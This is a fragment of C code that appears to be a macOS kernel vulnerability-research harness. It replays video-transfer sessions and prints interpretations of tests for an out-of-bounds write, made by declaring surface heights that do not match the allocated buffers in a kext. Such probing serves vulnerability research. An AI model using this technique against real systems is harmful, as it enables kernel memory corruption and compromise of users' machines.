    for (int bh = 1; bh <= 2; bh++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "MH%02d beat", bh);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(500000);
    }

    dprintf(STDOUT_FILENO, "%s  I read-offs:\n", pfx);
    dprintf(STDOUT_FILENO, "%s   M2S0 SHAPE: rows~32 = the HW programs the STRUCT dims (struct-fed confirmed -\n", pfx);
    dprintf(STDOUT_FILENO, "%s   the dims the kext validates against are the REAL surfaces, the dims the HW\n", pfx);
    dprintf(STDOUT_FILENO, "%s   writes are the DECLARED ones - the mismatch axis is live); rows~1080 = the\n", pfx);
    dprintf(STDOUT_FILENO, "%s   HW is real-fed (the declared dims are inert - the mismatch axis is dead).\n", pfx);
    dprintf(STDOUT_FILENO, "%s   M2S0b must write ALL rows (the shape-oracle control).\n", pfx);
    dprintf(STDOUT_FILENO, "%s   M2S1/S2 FLIP: H 32->1080 took = the surface REPORTS the new H with the old\n", pfx);
    dprintf(STDOUT_FILENO, "%s   alloc - the transfer then writes the new-H rows into the 32-row buffer:\n", pfx);
    dprintf(STDOUT_FILENO, "%s   A/C diffs = THE OOB WRITE PROVEN; B beyond row 32 = the same; H immutable =\n", pfx);
    dprintf(STDOUT_FILENO, "%s   the flip is dead (the last R/W axis closes).\n", pfx);
    dprintf(STDOUT_FILENO, "%s   M201 ACCEPT = the daemon still rides CPU.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  sweep done - .ips captureTime <-> [stamp]\n", pfx);
}
